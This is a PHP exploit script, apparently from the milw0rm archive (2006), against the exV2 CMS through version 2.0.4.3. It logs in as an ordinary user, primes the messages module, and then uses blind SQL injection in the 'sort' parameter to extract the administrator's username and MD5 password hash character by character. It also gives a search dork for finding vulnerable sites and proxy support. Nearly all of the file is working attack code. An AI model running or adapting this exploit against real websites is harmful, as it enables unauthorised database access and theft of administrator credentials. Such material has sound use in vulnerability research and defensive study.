@@ -1,0 +1,304 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+print_r('
+-------------------------------------------------------------------------------
+exV2 <= 2.0.4.3 "sort" SQL injection / administrative credentials disclosure
+exploit
+mail: retrog@alice.it
+site: http://retrogod.altervista.org
+dork: "Powered by eXV2 Vers"
+-------------------------------------------------------------------------------
+');
+/*
+this works regardless of php.ini settings
+against Mysql >= 4.1 (allowing subs)
+and if 'messages' module is enabled
+*/
+if ($argc<4) {
+print_r('
+-----------------------------------------------------------------------------
+Usage: php '.$argv[0].' host path user pass OPTIONS
+host:      target server (ip/hostname)
+path:      path to exv2
+user/pass: valide user credentials
+Options:
+ -T[prefix:   specify a table prefix, other than default (exv2_)
+ -p[port]:    specify a port other than 80
+ -P[ip:port]: specify a proxy
+Example:
+php '.$argv[0].' 2.2.2.2 /exv2/ rgod test -P1.1.1.1:80
+php '.$argv[0].' 1.1.1.1 / rgod test -p81
+-----------------------------------------------------------------------------
+');
+die;
+}
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$uname=$argv[3];
+$pass=$argv[4];
+$prefix="exv2_";
+
+$port=80;
+$proxy="";
+for ($i=5; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+if ($temp=="-T")
+{
+  $prefix=str_replace("-T","",$argv[$i]);
+}
+}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+//login
+$data="uname=$uname&pass=$pass&op=login";
+$packet ="POST ".$p."user.php HTTP/1.0\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Accept-Encoding: text/plain\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+$temp=explode("Set-Cookie: ",$html);
+$cookie="";
+for ($i=1; $i<count($temp); $i++)
+{
+  $temp2=explode(" ",$temp[$i]);
+  $temp3=explode("\r",$temp2[0]);
+  if (!strstr($temp3[0],";")){$temp3[0]=$temp3[0].";";}
+  $cookie.=$temp3[0];
+}
+echo "cookie ->".$cookie."\n";
+
+//retrieve your user id
+$packet ="GET ".$p."edituser.php HTTP/1.0\r\n";
+$packet.="Accept-Encoding: text/plain\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: ".$cookie."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+$temp=explode("userinfo.php?uid=",$html);
+$temp2=explode("'",$temp[1]);
+$uid=(int)$temp2[0];
+echo "uid -> ".$uid."\n";
+
+//configure your message box, needed...
+$data ="msg_mail=0";
+$data.="&msg_showdisc=0";
+$data.="&msg_showsend=0";
+$data.="&update=0";
+$data.="&op=config_save";
+$data.="&submit=Save";
+$packet ="POST ".$p."modules/messages/conf.php HTTP/1.0\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Accept-Encoding: text/plain\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Cookie: ".$cookie."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+sleep(1);
+
+//send to yourself some messages...
+for ($i=2; $i>=1; $i--)
+{
+$data='-----------------------------7d626f251b00fa
+Content-Disposition: form-data; name="to_userid"
+
+'.$uid.'
+-----------------------------7d626f251b00fa
+Content-Disposition: form-data; name="subject"
+
+11111111111111111111111'.$i.'
+-----------------------------7d626f251b00fa
+Content-Disposition: form-data; name="message"
+
+11111111111111111111111
+-----------------------------7d626f251b00fa
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+256000
+-----------------------------7d626f251b00fa
+Content-Disposition: form-data; name="msg_attachment"; filename=""
+
+
+-----------------------------7d626f251b00fa
+Content-Disposition: form-data; name="msg_attachment[max_file_size]"
+
+256000
+-----------------------------7d626f251b00fa
+Content-Disposition: form-data; name="msg_attachment[accepted]"
+
+
+-----------------------------7d626f251b00fa
+Content-Disposition: form-data; name="allow_html"
+
+1
+-----------------------------7d626f251b00fa
+Content-Disposition: form-data; name="allow_smileys"
+
+1
+-----------------------------7d626f251b00fa
+Content-Disposition: form-data; name="allow_bbcode"
+
+1
+-----------------------------7d626f251b00fa
+Content-Disposition: form-data; name="submit"
+
+Envoyer
+-----------------------------7d626f251b00fa--
+';
+$packet="POST ".$p."modules/messages/pmlite.php HTTP/1.0\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d626f251b00fa\r\n";
+$packet.="Accept-Encoding: text/plain\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cookie: $cookie\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+sleep(2);
+}
+
+//let's go...
+$md5s[0]=0;//null
+$md5s=array_merge($md5s,range(48,57)); //numbers
+$md5s=array_merge($md5s,range(97,102));//a-f letters
+//print_r(array_values($md5s));
+$j=1;
+$my_password="";
+while (!strstr($my_password,chr(0)))
+{
+for ($i=0; $i<=255; $i++)
+{
+if (in_array($i,$md5s))
+{
+$sql="(SELECT(IF((ASCII(SUBSTRING(pass,$j,1))=".$i."),msg_time,subject))FROM/**/".$prefix."users/**/WHERE/**/rank=7/**/and/**/level=5)/**/ASC/**/LIMIT/**/1/*";
+echo "sql -> ".$sql."\r\n";
+$sql=urlencode($sql);
+$packet ="GET ".$p."modules/messages/index.php?sort=$sql&by=suntzu HTTP/1.0\r\n";
+$packet.="Accept-Encoding: text/plain\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: ".$cookie."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (!strstr($html,"111111111111111111111111")){$my_password.=chr($i);echo "password -> ".$my_password."[???]\n";sleep(1);break;}
+}
+if ($i==255) {die("Exploit failed...");}
+}
+$j++;
+}
+
+$j=1;
+$my_admin="";
+while (!strstr($my_admin,chr(0)))
+{
+for ($i=0; $i<=255; $i++)
+{
+$sql="(SELECT(IF((ASCII(SUBSTRING(uname,$j,1))=".$i."),msg_time,subject))FROM/**/".$prefix."users/**/WHERE/**/rank=7/**/and/**/level=5)/**/ASC/**/LIMIT/**/1/*";
+echo "sql -> ".$sql."\r\n";
+$sql=urlencode($sql);
+$packet ="GET ".$p."modules/messages/index.php?sort=$sql&by=suntzu HTTP/1.0\r\n";
+$packet.="Accept-Encoding: text/plain\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: ".$cookie."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (!strstr($html,"111111111111111111111111")){$my_admin.=chr($i);echo "admin -> ".$my_admin."[???]\n";sleep(1);break;}
+if ($i==255) {die("Exploit failed...");}
+}
+$j++;
+}
+echo "--------------------------------------------------------------------\n";
+echo "admin          -> ".$my_admin."\n";
+echo "password (md5) -> ".$my_password."\n";
+echo "--------------------------------------------------------------------\n";
+
+function is_hash($hash)
+{
+ if (ereg("^[a-f0-9]{32}",trim($hash))) {return true;}
+ else {return false;}
+}
+
+if (is_hash($my_password)) {echo "Exploit succeeded...";}
+else {echo "Exploit failed...";}
+?>
+
+# milw0rm.com [2006-09-21]
